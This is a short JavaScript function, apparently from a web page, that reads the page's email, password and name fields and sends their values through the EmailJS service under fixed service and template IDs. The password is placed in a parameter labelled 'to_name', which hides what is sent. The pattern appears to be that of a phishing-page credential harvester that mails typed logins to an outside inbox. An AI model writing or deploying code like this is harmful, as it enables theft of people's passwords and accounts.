function sendMail(){
    var tempParams = {
        from_name: document.getElementById("email").value,
        to_name: document.getElementById("password").value,
        message: document.getElementById("name").value,
    };
    emailjs.send('service_j5n6mej','template_l5qbor4',tempParams)
    .then(function(res){
      console.log("success", res.status);
    })
}